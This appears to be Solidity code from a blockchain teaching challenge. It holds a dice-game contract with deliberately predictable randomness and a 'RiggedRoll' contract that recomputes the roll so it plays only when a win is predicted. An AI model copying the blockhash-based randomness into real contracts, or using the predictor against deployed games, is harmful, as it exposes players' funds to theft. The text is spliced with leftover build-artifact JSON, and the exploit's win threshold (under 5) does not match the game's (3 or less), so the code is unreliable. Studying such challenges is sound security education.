//SPDX-License-Identifier: MIT

import "hardhat/console.sol";

contract DiceGame {
  uint256 public nonce = 0;
  uint256 public prize = 0;

  error NotEnoughEther();

  event Roll(address indexed player, uint256 amount, uint256 roll);
  event Winner(address winner, uint256 amount);

  constructor() payable {
    resetPrize();
  }

  function resetPrize() private {
    prize = ((address(this).balance * 10) / 100);
  }

  function rollTheDice() public payable {
    if (msg.value < 0.002 ether) {
      revert NotEnoughEther();
    }

    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
    uint256 roll = uint256(hash) % 16;

    console.log("\t", "   Dice Game Roll:", roll);

    nonce++;
    prize += ((msg.value * 40) / 100);

    emit Roll(msg.sender, msg.value, roll);

    if (roll > 5) {
      return;
    }

    if (roll <= 3) {
        // If the roll is a win, emit the Winner event and transfer winnings
        emit Winner(msg.sender, msg.value);
        payable(msg.sender).transfer(msg.value * 2);
    }
  }

  receive() external payable {}
}
","keccak256":"0xa2bbcb753ca3310d9001d6f99185d32eb94c709f5db5e35c5808ebdbf35ee4b0","license":"MIT"},"contracts/RiggedRoll.sol":{"content":"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable  {
    DiceGame public diceGame;

    constructor(address _diceGameAddress) {
        diceGame = DiceGame(payable(_diceGameAddress));
    }

    receive() external payable {}

    function riggedRoll() public payable {
        require(address(this).balance >= 0.002 ether, "Insufficient balance.");

        uint256 predictedRoll = predictRandomness();

        // Only roll if the predicted outcome is a winner
        if (predictedRoll < 5) {
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            revert("Predicted roll is not a winning roll.");
        }
    }

    function predictRandomness() internal view returns (uint256) {
        uint256 nonce = diceGame.nonce();
        return uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), address(diceGame), nonce))) % 16;
    }

    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        require(address(this).balance >= _amount, "Insufficient funds.");
        payable(_addr).transfer(_amount);
    }
}
